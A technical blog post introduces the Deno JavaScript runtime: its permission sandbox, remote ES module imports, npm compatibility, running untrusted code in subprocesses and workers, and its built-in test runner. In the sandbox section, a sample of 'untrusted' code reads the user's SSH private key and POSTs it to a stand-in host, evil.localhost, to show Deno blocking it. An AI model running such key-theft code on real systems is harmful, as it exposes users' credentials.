+++
author = "Roman Zaynetdinov"
date = 2023-03-06T12:00:00+03:00
title = "What is Deno and how to use its sandbox?"
description = "Deno is an alternative runtime for JavaScript. It comes with TypeScript support and a sandbox out of the box."
draft = false

[extra]
preview_image = { href = "/post/what-is-deno/deno_hr.png", alt = "Deno logo" }
+++

[Deno](https://deno.land) is an alternative JavaScript runtime that uses V8 and Rust. Think of Node.js but with some different design decisions. Deno comes with built-in support for TypeScript, ES modules, test runner, code formatter, LSP server and sandboxed execution.

{% labeled_img(label="Deno logo") %}
<img src="./deno_hr.png" alt="Deno logo" width="256" height="256 loading="lazy" />
{% end %}

> Check out a cool sandbox demo in [Deno Deploy](#deno-deploy) section.


## Basic example

```ts
// write-file.ts
await Deno.writeTextFile("hello.txt", "Hello World");
```

Let's try to run this example: 

```
deno run write-file.ts
⚠️ ┌ Deno requests write access to "hello.txt".
   ├ Requested by `Deno.writeFile()` API
   ├ Run again with --allow-write to bypass this prompt.
   └ Allow? [y/n] (y = yes, allow; n = no, deny) > 
```

You can see built-in sandbox in action here. Deno stops execution as it notices that we are trying to write to a file without explicitly specifying a write permission. We can either type `y` and hit Enter or rerun the script with a permission flag:

```
> deno run --allow-write write-file.ts 
> cat hello.txt 
Hello World
```

> If you want to play around with Deno you can just run [remote examples](https://examples.deno.land/) like `deno run https://examples.deno.land/hello-world.ts`.


## ES modules

Deno uses browser standard ES6 modules. You can import a local file or a remote file.

```ts
// local-util.ts
export function sayLocalHello(thing: string) {
  console.log(`Hello (local), ${thing}!`);
}
```

Our import example imports both local and remote modules.

```ts
// import-example.ts
import { sayLocalHello } from './local-util.ts';
import { sayHello } from 'https://examples.deno.land/import-export/util.ts';

sayLocalHello('Tom');
sayHello('Alice');
```

If you go to <https://examples.deno.land/import-export/util.ts> you will see that it is just a TypeScript file similar to our local one.

```
> deno run import-example.ts 
Hello (local), Tom!
Hello, Alice!
```

When Deno enounters a remote import it simply downloads the file and imports it. Remember that we have an always-on sandbox enabled so your script will not run anything that you haven't given permission for.

> In real life scenarios you would use [Deno's integrity checking](https://deno.land/manual@v1.31.1/basics/modules/integrity_checking) with lock files.

### Private modules

It is possible to fetch private modules. Deno needs to authenticated with the remote server. You just need to set an environment variable like 

```
DENO_AUTH_TOKENS=abc123@deno.land
```

and now every HTTP request to fetch module from deno.land host will include an `Authorization` header with `Bearer abc123` value.

### NPM

While Deno is purposefully built not to require NPM at all they are hard at work to provide a compatibility layer in case you want to use NPM dependencies or Node.js built-in modules. In either case you do need to add an `npm:` or `node:` specifier to the import path.

```ts
// You can import NPM dependencies directly.
import chalk from "npm:chalk@5";
console.log(chalk.green("Hello!"));
```

```ts
// You can import Node.js built-in modules directly. 
import { readFileSync } from "node:fs";
console.log(readFileSync("deno.json", { encoding: "utf8" }));
```


## Sandbox

Let's talk more about Deno's sandbox. Deno provides us with [capability-based permissions](https://deno.land/manual@v1.31.1/basics/permissions) that apply to a whole process. This is what we saw earlier when we tried to write to a file. Deno required us to specify `allow-write` permission. These permissions apply to all modules within a process.

What if you want to execute untrusted code as part of your application? You can either just run it and hope for the best (e.g editor plugins) or you can run the code inside Docker containers. Now there is one more option: Deno. With Deno it becomes much simpler and more lightweight.

How do we execute untrusted code?

There are two options. First, is to run a subprocess with a different permission set.

```ts
// user-code.ts
// This is untrusted user-code that we want to execute safely.

const privateKey = await Deno.readFile(Deno.env.get("HOME") + "/.ssh/id_ed25519");
await fetch('http://evil.localhost', {
  method: 'POST',
  body: privateKey
});
```

Now everytime we want to execute untrusted code we just spawn a subprocess.

```ts
const p = Deno.run({ cmd: ["deno", "run", "--no-prompt", "./user-code.ts"] });
const { code } = await p.status();
Deno.exit(code);
```

Lucky for us when we run our process it fails with:

```
> deno run --allow-run runner.ts
error: Uncaught PermissionDenied: Requires env access to "HOME", run again with the --allow-env flag
const privateKey = await Deno.readFile(Deno.env.get("HOME") + "/.ssh/id_ed25519");
```

What if you want user code to reference other files? Then you need to add `allow-read` permission. *Yes, you can do finer graned limitations by specifying file paths or hosts the process can have access to.*

In the end our runner could become something like:

```ts
// runner.ts
const p = Deno.run({
  cmd: [
    "deno",
    "run",
    // Do not prompt for permissions. Fail immediately.
    "--no-prompt",
    // Allow reading files from external directory only.
    "--allow-read=./external",
    // Allow reaching safe.localhost host on port 443.
    "--allow-net=safe.localhost:443",
    "./user-code.ts",
  ],
});
const { code } = await p.status();
Deno.exit(code);
```

Execute with `deno run --allow-run runner.ts`. Process should still fail due to missing permissions.

**Summary:**

* You can specify permissions on subprocess indendently
* You can specify finer-grained permissions if necessary. E.g if you allow reading files you can limit the paths.

Per process sandbox is not the only way you can limit permissions. Deno supports [Web Workers](https://deno.land/manual@v1.31.1/runtime/workers) with an unstable support for specifying permissions per web worker.

```ts
// worker-runner.ts
const worker = new Worker(new URL("./user-code.ts", import.meta.url).href, {
  type: "module",
  deno: {
    permissions: "none",
  },
});
```

Let's try running the same user code but in a worker.

```
> deno run --unstable --allow-all --no-prompt sandbox.ts
error: Uncaught (in worker "") PermissionDenied: Requires env access to "HOME", run again with the --allow-env flag
const privateKey = await Deno.readFile(Deno.env.get("HOME") + "/.ssh/id_ed25519");
                                                ^
    at Object.getEnv [as get] (deno:runtime/js/30_os.js:86:16)
    at file:///.../user-code.ts:4:49
```

Great! Even though we provide all permissions to the main process, our user code fails to be executed due to a missing permission. 

In the next section you can play around with an actual app that executes user code in a web worker sandbox.

### Deno Deploy

Deno Deploy is a serverless hosting platform running on the edge. That's a lot to unpack... 

> *Serverless* is a development model that allows developers to build and run applications without having to manage servers. You push the code and the platform runs it on their servers. The platform manages where the code is running and how. Think AWS Lambda but with support for long running processes.

> *Hosting on the edge* means CDN-like deployment. Platform runs your application on many different machines [distributed over the globe](https://deno.com/blog/anatomy-isolate-cloud). When user sends a request, the platform uses anycast network to find the closest process and forwards user's request there. 

In this chapter let's try to build an app that will safely execute user-submitted code. We want to:

* Run code from external users safely (sandboxing user code)
* Execute the code immediately (respond within the same request-response cycle)

> I was going to deploy my sample app to Deno Deploy but in the process I hit two road blocks.  
> First one was that Deno Deploy doesn't support [new import map location](https://deno.com/blog/v1.30#denojson-becomes-an-import-map) (instead of a separate file you can [configure import map](https://github.com/zaynetro/draw-by-zaynetro/commit/bd2944cd77c49bc5c68137117311444cf27951cc) in `deno.json`). It was easy to solve but rather annoying.  
> Second was a bummer: [Workers are not supported there](https://deno.com/deploy/docs/runtime-api)... I planned to use a Worker to execute third-party code.
>
> I didn't want to rewrite my app to potentially hit another limitation so I deployed it elsewhere: [fly.io](https://fly.io/).

What can you do with it? The app is a simple sandbox that executes code submitted by users and draws SVGs. You can play around with the code below. SVG will rerender automatically as you type.

{{ draw_by_zaynetro() }}

The server is open-source and you can see how sandbox works on [GitHub](https://github.com/zaynetro/draw-by-zaynetro).

{{ poll(id="deno-read-more" title="What would you like to read more about?", items=["More about Deno", "Passkeys", "Conflict-free Replicated Data Types (CRDTs)", "End-to-end encryption with MLS"]) }}


## Test runner

Are you still debating whether you should use jest or jasmine? Are you having difficulties setting up TypeScript support in jest? Don't know whether to use jest or ts-jest? You don't need to answer any of these questions with Deno. Deno comes with a test runner out of the box.

```ts
// url_test.ts
import { assertEquals } from "https://deno.land/std@0.178.0/testing/asserts.ts";

Deno.test("url test", () => {
  const url = new URL("./foo.js", "https://deno.land/");
  assertEquals(url.href, "https://deno.land/foo.js");
});
```

And then just:

```
> deno test url_test.ts 
Check file:///.../url_test.ts
running 1 test from ./url_test.ts
url test ... ok (5ms)

ok | 1 passed | 0 failed (23ms)
```


As an experiment let's see if we can reuse Deno's test runner in some other scenarios. 

> Note, that Deno recommends using [other tools](https://deno.land/manual@v1.31.1/tools/bundler#bundling-for-the-web) if you plan to bundle for the Web. Deno is not intended to replace existing build tools for your UI applications.

With this thought in mind let's still say we have a [preact](https://preactjs.com/) UI application and we want to test it. Is Deno generic enough to support this use case?

```ts
// Counter.tsx
import { useState } from "preact/hooks";

interface Props {
  initialCount: number;
}

export default function Counter({ initialCount }: Props) {
  const [count, setCount] = useState(initialCount);
  const increment = () => setCount(count + 1);

  return (
    <div>
      Current value: {count}
      <button onClick={increment}>Increment</button>
    </div>
  );
}
```

Now comes the interesting part: our test file.

```ts
// Counter_test.tsx
import { fireEvent, render, waitFor, cleanup } from "@testing-library/preact";
import { assertEquals, assertExists } from "std/testing/asserts.ts";
import { JSDOM } from "jsdom";
import Counter from "./Counter.tsx";

// Setup JSDOM
const doc = new JSDOM("");
globalThis.document = doc.window.document;

Deno.test("Counter", async (t) => {
  await t.step("should display initial count", () => {
    cleanup();
    const { container } = render(<Counter initialCount={5} />);
    assertEquals(container.textContent, "Current value: 5Increment");
  });

  await t.step(
    'should increment after "Increment" button is clicked',
    async () => {
      cleanup();
      const { getByText } = render(<Counter initialCount={5} />);

      fireEvent.click(getByText("Increment"));
      await waitFor(() => {
        assertExists(getByText("Current value: 6"));
      });
    },
  );
});

// Instead of manual clean up before each test we can use Deno's BDD testing methods: 
// describe, it, beforeEach from "https://deno.land/std@0.178.0/testing/bdd.ts".
```

> I use built-in assertion methods to verify the state. It is possible to set up Jest-like matchers. Huge thanks to John Griffin for [figuring out the path](https://github.com/john-griffin/deno-dom-test/blob/main/test_globals.ts).

You may have noticed that our imports do not specify any versions. That's because I am using an import map which I define in Deno's configuration file.

```ts
// deno.jsonc
{
  // Specify what JSX should be transpiled to.
  "compilerOptions": {
    "jsx": "react-jsx",
    "jsxImportSource": "preact"
  },
  // Our import map
  "imports": {
    "preact": "https://cdn.skypack.dev/preact@10.13.0",
    "preact/": "https://cdn.skypack.dev/preact@10.13.0/",
    "@testing-library/preact": "https://cdn.skypack.dev/@testing-library/preact@3.2.3",
    // jsdom from skypack didn't work
    "jsdom": "https://esm.sh/v102/jsdom@21.1.0",
    "std/": "https://deno.land/std@0.178.0/"
  },
  // Ref: https://deno.land/manual@v1.31.1/basics/import_maps#overriding-imports
  "scopes": {
    "https://esm.sh/v102/jsdom@21.1.0/": {
      "https://deno.land/std@0.175.0/node/vm.ts": "./vm.ts"
    }
  }
}
```

JSDOM requires a Node-specific method that is not available in Deno. Luckily, it is possible to override a single import using "scopes".

```ts
// vm.ts 
export default {
  isContext: () => false,
};
```

Now we can finally run the tests:

```
> deno test --no-check --allow-env Counter_test.tsx
running 1 test from ./Counter_test.tsx
Counter ...
  should display initial count ... ok (6ms)
  should increment after "Increment" button is clicked ... ok (9ms)
Counter ... ok (20ms)
```

Hooray! We are able to test even preact UI with Deno. Sadly, right after success message there is an exception:

```
Uncaught error from ./Counter_test.tsx FAILED

 ERRORS 

./Counter_test.tsx (uncaught error)
error: Error: Deno.core.runMicrotasks() is not supported in this environment
      throw new Error(
            ^
    at Object.runMicrotasks (https://deno.land/std@0.170.0/node/_core.ts:22:13)
    at processTicksAndRejections (https://deno.land/std@0.170.0/node/_next_tick.ts:62:10)
    at https://deno.land/std@0.170.0/node/process.ts:375:7
This error was not caught from a test and caused the test runner to fail on the referenced module.
It most likely originated from a dangling promise, event/timeout handler or top-level code.
```

I haven't been able to fully figure out why it happens. Maybe some dangling promises or JSDOM assumes Node.js? `¯\_(ツ)_/¯` Let me know if you figured out the answer!


### Summary 

For UI tests I would recommend to stick with Vitest, Cypress or Playwright.


## Other runtimes

Deno is not the only one Node.js alternative. There is also [Bun](https://bun.sh/) which is WebKit-based. 

> Note that Bun's performance benchmarks may not represent the real world situation. [Read more](https://github.com/denoland/deno/discussions/15121).

